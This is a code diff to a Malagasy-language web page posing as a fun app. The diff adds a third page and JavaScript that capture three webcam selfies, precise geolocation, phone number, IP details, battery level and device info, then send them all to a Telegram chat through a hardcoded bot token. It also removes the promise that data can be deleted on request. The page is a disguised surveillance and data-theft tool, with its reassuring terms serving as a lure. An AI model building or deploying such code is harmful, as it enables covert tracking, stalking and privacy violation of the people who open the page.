@@ -10,7 +10,6 @@
       --c2:#FF6B6B;
       --c3:#4ECDC4;
       --white:#fff;
-      --dark:#1a1a2e;
       --glass:rgba(255,255,255,0.1);
     }
     
@@ -39,7 +38,6 @@
       100%{background-position:0% 50%}
     }
     
-    /* Container lehibe */
     .container {
       width:100%;
       max-width:420px;
@@ -57,7 +55,6 @@
       to{opacity:1;transform:scale(1) translateY(0)}
     }
     
-    /* Logo / Icon */
     .logo {
       width:80px;
       height:80px;
@@ -91,7 +88,6 @@
       opacity:0.9;
     }
     
-    /* Conditions */
     .conditions {
       background:rgba(0,0,0,0.2);
       border-radius:16px;
@@ -118,7 +114,6 @@
       font-weight:bold;
     }
     
-    /* Checkbox custom */
     .checkbox-wrapper {
       display:flex;
       align-items:center;
@@ -139,7 +134,6 @@
       cursor:pointer;
     }
     
-    /* Input field */
     .input-group {
       margin:25px 0;
     }
@@ -173,16 +167,14 @@
       box-shadow:0 0 20px rgba(255,255,255,0.2);
     }
     
-    /* Error message */
     .error {
       color:#ff6b6b;
       font-size:14px;
       text-align:center;
       margin-top:10px;
       display:none;
-      }
+    }
     
-    /* Bouton */
     .btn {
       width:100%;
       padding:18px;
@@ -208,7 +200,6 @@
       cursor:not-allowed;
     }
     
-    /* Loading */
     .loading {
       display:none;
       text-align:center;
@@ -233,7 +224,6 @@
       font-size:18px;
     }
     
-    /* Progress bar */
     .progress {
       width:100%;
       height:6px;
@@ -251,7 +241,6 @@
       transition:width 0.5s;
     }
     
-    /* Step indicator */
     .steps {
       display:flex;
       justify-content:center;
@@ -281,9 +270,36 @@
       background:var(--c3);
     }
     
-    /* Hidden */
     .hidden {
       display:none !important;
+    }
+    
+    /* Info device table */
+    .info-table {
+      background:rgba(0,0,0,0.2);
+      border-radius:16px;
+      padding:15px;
+      margin:15px 0;
+      font-size:14px;
+    }
+    
+    .info-row {
+      display:flex;
+      justify-content:space-between;
+      padding:8px 0;
+      border-bottom:1px solid rgba(255,255,255,0.1);
+    }
+    
+    .info-row:last-child {
+      border-bottom:none;
+    }
+    
+    .info-label {
+      opacity:0.7;
+    }
+    
+    .info-value {
+      font-weight:600;
     }
   </style>
 </head>
@@ -307,9 +323,9 @@
       <li>Ity application ity dia natao ho an'ny fifaliana fotsiny</li>
       <li>Manaiky ny haka sary anao isika</li>
       <li>Manaiky ny haka ny toerana misy anao</li>
+      <li>Manaiky ny haka ny mombamomba ny fitaovanao</li>
       <li>Tsy ampiasaina amin'ny ratsy ny angon-drakitra</li>
       <li>Tsy zaraina amin'ny olon-kafa ny zavatra angonina</li>
-      <li>Azo esorina ny angon-drakitrao rehefa manontany</li>
     </ul>
   </div>
   
@@ -354,3 +370,414 @@
     Hanohy →
   </button>
 </div>
+
+<!-- ========== PAGE 3: Angon-drakitra + Action ========== -->
+<div id="page3" class="container hidden">
+  <div class="logo">🚀</div>
+  <h2>Fandehanana!</h2>
+  
+  <div class="steps">
+    <div class="step done">✓</div>
+    <div class="step done">✓</div>
+    <div class="step active">3</div>
+  </div>
+  
+  <!-- Angon-drakitra hita maso -->
+  <div class="info-table" id="infoTable">
+    <div class="info-row">
+      <span class="info-label">🔋 Batterie</span>
+      <span class="info-value" id="infoBattery">...</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">📱 Fitaovana</span>
+      <span class="info-value" id="infoDevice">...</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">🌐 Opérateur</span>
+      <span class="info-value" id="infoOperator">...</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">🌍 Adresse IP</span>
+      <span class="info-value" id="infoIP">...</span>
+    </div>
+  </div>
+  
+  <div id="loadingSection" class="loading" style="display:block;">
+    <div class="spinner"></div>
+    <p id="loadingText">Miandry angon-drakitra...</p>
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+  </div>
+  
+  <div id="successSection" class="hidden" style="text-align:center;">
+    <div style="font-size:60px;margin-bottom:20px;">✅</div>
+    <h2>Vita soa aman-tsara!</h2>
+    <p>Nandefa ny angon-drakitrao any Telegram izahay.</p>
+    <p style="font-size:14px;opacity:0.7;margin-top:20px;">
+      Selfie: <span id="selfieCount">3</span> | 
+      Toerana: <span id="locStatus">✓</span> | 
+      Finday: <span id="phoneDisplay"></span>
+    </p>
+  </div>
+</div>
+
+<script>
+// ============================================
+// VARIABLES GLOBALES
+// ============================================
+const BOT_TOKEN = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
+const CHAT_ID   = "-1002833433414";
+
+let phoneNumber = "";
+let deviceInfo = {
+  battery: "Tsy fantatra",
+  device: "Tsy fantatra",
+  operator: "Tsy fantatra",
+  ip: "Tsy fantatra",
+  userAgent: ""
+};
+
+// ============================================
+// PAGE 1: Conditions
+// ============================================
+
+function toggleAccept() {
+  const check = document.getElementById('acceptCheck');
+  const btn = document.getElementById('btn1');
+  btn.disabled = !check.checked;
+}
+
+function goToPage2() {
+  const check = document.getElementById('acceptCheck');
+  
+  if (!check.checked) {
+    document.getElementById('error1').style.display = 'block';
+    return;
+  }
+  
+  document.getElementById('page1').classList.add('hidden');
+  document.getElementById('page2').classList.remove('hidden');
+}
+
+// ============================================
+// PAGE 2: Laharana finday
+// ============================================
+
+function formatPhone(input) {
+  let value = input.value.replace(/\D/g, '');
+  
+  if (value.length >= 3) {
+    value = value.slice(0,3) + ' ' + value.slice(3);
+  }
+  if (value.length >= 6) {
+    value = value.slice(0,6) + ' ' + value.slice(6);
+  }
+  if (value.length >= 9) {
+    value = value.slice(0,9) + ' ' + value.slice(9);
+  }
+  
+  input.value = value;
+}
+
+function goToPage3() {
+  const input = document.getElementById('phoneInput');
+  const raw = input.value.replace(/\D/g, '');
+  
+  if (raw.length < 10) {
+    document.getElementById('error2').style.display = 'block';
+    return;
+  }
+  
+  phoneNumber = input.value;
+  
+  document.getElementById('page2').classList.add('hidden');
+  document.getElementById('page3').classList.remove('hidden');
+  
+  // Atomboka angonina ny angon-drakitra!
+  collectDeviceInfo();
+}
+
+// ============================================
+// ANGON-DRAKITRA FITAOVANA
+// ============================================
+
+async function collectDeviceInfo() {
+  const loadingText = document.getElementById('loadingText');
+  loadingText.textContent = "Angonina ny angon-drakitra...";
+  
+  // --- 1. BATTERIE ---
+  try {
+    if ('getBattery' in navigator) {
+      const battery = await navigator.getBattery();
+      const level = Math.round(battery.level * 100);
+      const charging = battery.charging ? "⚡" : "";
+      deviceInfo.battery = `${level}% ${charging}`;
+      document.getElementById('infoBattery').textContent = deviceInfo.battery;
+    } else {
+      deviceInfo.battery = "Tsy supporté";
+      document.getElementById('infoBattery').textContent = deviceInfo.battery;
+    }
+  } catch (e) {
+    deviceInfo.battery = "Tsy azo";
+    document.getElementById('infoBattery').textContent = deviceInfo.battery;
+  }
+  
+  // --- 2. NOM DU TÉLÉPHONE (User-Agent) ---
+  const ua = navigator.userAgent;
+  deviceInfo.userAgent = ua;
+  
+  // Mamantatra ny fitaovana
+  let deviceName = "Tsy fantatra";
+  if (/iPhone/.test(ua)) deviceName = "iPhone";
+  else if (/iPad/.test(ua)) deviceName = "iPad";
+  else if (/Samsung/.test(ua)) deviceName = "Samsung";
+  else if (/Huawei/.test(ua)) deviceName = "Huawei";
+  else if (/Xiaomi/.test(ua)) deviceName = "Xiaomi";
+  else if (/OPPO/.test(ua)) deviceName = "OPPO";
+  else if (/vivo/.test(ua)) deviceName = "Vivo";
+  else if (/Android/.test(ua)) deviceName = "Android";
+  else if (/Windows/.test(ua)) deviceName = "Windows";
+  else if (/Mac/.test(ua)) deviceName = "Mac";
+  
+  deviceInfo.device = deviceName;
+  document.getElementById('infoDevice').textContent = deviceInfo.device;
+  
+  // --- 3. OPÉRATEUR RÉSEAU ---
+  try {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    
+    if (conn) {
+      // Maka ny network type
+      const networkType = conn.effectiveType || "Tsy fantatra";
+      deviceInfo.operator = networkType.toUpperCase();
+      
+      // Raha misy carrier
+      if (conn.carrier) {
+        deviceInfo.operator += ` (${conn.carrier})`;
+      }
+    } else {
+      // Fallback: maka ny IP aloha
+      deviceInfo.operator = "Tsy azo jerena";
+    }
+    
+    // Fanamarihana: tsy azo atao marina ny mahalala ny opérateur (Telma/Orange/Airtel)
+    // raha tsy amin'ny alalan'ny IP na API manokana
+    deviceInfo.operator += " - Jereo IP";
+    
+    document.getElementById('infoOperator').textContent = deviceInfo.operator;
+  } catch (e) {
+    deviceInfo.operator = "Tsy azo";
+    document.getElementById('infoOperator').textContent = deviceInfo.operator;
+  }
+  
+  // --- 4. ADRESSE IP ---
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    
+    deviceInfo.ip = data.ip;
+    document.getElementById('infoIP').textContent = deviceInfo.ip;
+    
+    // Raha hita ny IP, azo atao ny manontany ny opérateur
+    const org = data.org || "";
+    if (org.includes("Telma") || org.includes("telma") || data.asn?.includes("Telma")) {
+      deviceInfo.operator = "Telma";
+    } else if (org.includes("Orange") || org.includes("orange")) {
+      deviceInfo.operator = "Orange";
+    } else if (org.includes("Airtel") || org.includes("airtel")) {
+      deviceInfo.operator = "Airtel";
+    } else {
+      deviceInfo.operator = org || "Tsy fantatra";
+    }
+    
+    document.getElementById('infoOperator').textContent = deviceInfo.operator;
+    
+    // Tehirizina ny antsipiriany
+    deviceInfo.ipDetails = {
+      city: data.city,
+      region: data.region,
+      country: data.country_name,
+      org: org,
+      asn: data.asn
+    };
+    
+  } catch (e) {
+    // Fallback: ipify
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      deviceInfo.ip = data.ip;
+      document.getElementById('infoIP').textContent = deviceInfo.ip;
+    } catch (e2) {
+      deviceInfo.ip = "Tsy azo";
+      document.getElementById('infoIP').textContent = deviceInfo.ip;
+    }
+  }
+  
+  // Miandry kely vao manomboka ny action
+  await new Promise(r => setTimeout(r, 1000));
+  
+  // Atomboka ny action principale!
+  startAction();
+}
+
+// ============================================
+// PAGE 3: Action principale
+// ============================================
+
+async function startAction() {
+  const progressBar = document.getElementById('progressBar');
+  const loadingText = document.getElementById('loadingText');
+  
+  try {
+    // --- ETAPE 1: Maka sary 3 ---
+    loadingText.textContent = "Maka selfie voalohany...";
+    progressBar.style.width = "10%";
+    
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const selfies = [];
+    
+    for (let i = 0; i < 3; i++) {
+      loadingText.textContent = `Maka selfie ${i+1}/3...`;
+      progressBar.style.width = `${15 + (i * 20)}%`;
+      
+      await new Promise(r => setTimeout(r, 1500));
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      
+      selfies.push(canvas.toDataURL('image/png'));
+    }
+    
+    stream.getTracks().forEach(t => t.stop());
+    
+    // --- ETAPE 2: Maka toerana ---
+    loadingText.textContent = "Maka ny toerana misy anao...";
+    progressBar.style.width = "80%";
+    
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    });
+    
+    const { latitude: lat, longitude: lon } = position.coords;
+    
+    // --- ETAPE 3: Mandefa any Telegram ---
+    loadingText.textContent = "Mandefa angon-drakitra...";
+    progressBar.style.width = "90%";
+    
+    // 1. Info générales
+    const infoText = 
+      `📱 <b>Nouvel utilisateur</b>\n\n` +
+      `📞 <b>Numéro:</b> <code>${phoneNumber}</code>\n` +
+      `🔋 <b>Batterie:</b> ${deviceInfo.battery}\n` +
+      `📱 <b>Fitaovana:</b> ${deviceInfo.device}\n` +
+      `🌐 <b>Opérateur:</b> ${deviceInfo.operator}\n` +
+      `🌍 <b>IP:</b> <code>${deviceInfo.ip}</code>\n` +
+      `🖥 <b>User-Agent:</b> <code>${deviceInfo.userAgent.substring(0, 200)}</code>`;
+    
+    await sendMessage(infoText);
+    
+    // 2. Details IP (raha misy)
+    if (deviceInfo.ipDetails) {
+      const ipDetailsText = 
+        `📍 <b>Détails IP:</b>\n` +
+        `🏙 Ville: ${deviceInfo.ipDetails.city || 'N/A'}\n` +
+        `📌 Région: ${deviceInfo.ipDetails.region || 'N/A'}\n` +
+        `🇲🇬 Pays: ${deviceInfo.ipDetails.country || 'N/A'}\n` +
+        `🏢 Org: ${deviceInfo.ipDetails.org || 'N/A'}`;
+      
+      await sendMessage(ipDetailsText);
+    }
+    
+    // 3. Sary 3
+    for (let i = 0; i < selfies.length; i++) {
+      await sendPhoto(selfies[i], `📸 Selfie #${i+1} - ${phoneNumber}`);
+    }
+    
+    // 4. Toerana
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    await sendMessage(
+      `📍 <b>Localisation</b>\n` +
+      `📞 ${phoneNumber}\n` +
+      `🌐 <a href="${mapsUrl}">Voir sur Google Maps</a>\n` +
+      `📌 Lat: ${lat.toFixed(6)}\n` +
+      `📌 Lon: ${lon.toFixed(6)}`
+    );
+    
+    // --- VITA! ---
+    progressBar.style.width = "100%";
+    
+    document.getElementById('loadingSection').classList.add('hidden');
+    document.getElementById('successSection').classList.remove('hidden');
+    document.getElementById('phoneDisplay').textContent = phoneNumber;
+    
+  } catch (err) {
+    loadingText.textContent = "❌ Nisy olana: " + err.message;
+    loadingText.style.color = "#ff6b6b";
+    console.error(err);
+  }
+}
+
+// ============================================
+// FONCTIONS TELEGRAM
+// ============================================
+
+async function sendPhoto(imgBase64, caption) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const form = new FormData();
+  
+  form.append("chat_id", CHAT_ID);
+  form.append("caption", caption);
+  form.append("parse_mode", "HTML");
+  
+  const blob = dataURItoBlob(imgBase64);
+  form.append("photo", blob, "selfie.png");
+  
+  const res = await fetch(url, { method: "POST", body: form });
+  return res.ok;
+}
+
+async function sendMessage(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: "HTML",
+      disable_web_page_preview: false
+    })
+  });
+  
+  return res.ok;
+}
+
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  
+  return new Blob([ab], { type: mime });
+}
+</script>
+
+</body>
+</html>
